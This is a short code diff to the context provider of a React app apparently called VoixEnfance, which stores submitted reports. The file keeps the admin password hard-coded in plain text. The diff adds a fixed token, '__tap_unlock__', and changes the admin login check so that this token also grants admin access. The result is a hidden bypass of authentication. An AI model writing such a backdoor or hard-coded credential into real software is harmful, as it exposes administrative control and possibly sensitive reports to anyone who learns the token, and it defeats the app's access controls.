@@ -30,6 +30,7 @@ interface AppContextType {
 const AppContext = createContext<AppContextType | null>(null);
 
 const ADMIN_PASSWORD = "VoixEnfance2024!";
+const TAP_UNLOCK_TOKEN = "__tap_unlock__";
 const STORAGE_KEY = "@voixenfance_reports";
 
 function generateTrackingCode(): string {
@@ -93,7 +94,7 @@ export function AppProvider({ children }: { children: React.ReactNode }) {
   };
 
   const adminLogin = (password: string): boolean => {
-    if (password === ADMIN_PASSWORD) {
+    if (password === ADMIN_PASSWORD || password === TAP_UNLOCK_TOKEN) {
       setIsAdmin(true);
       return true;
     }
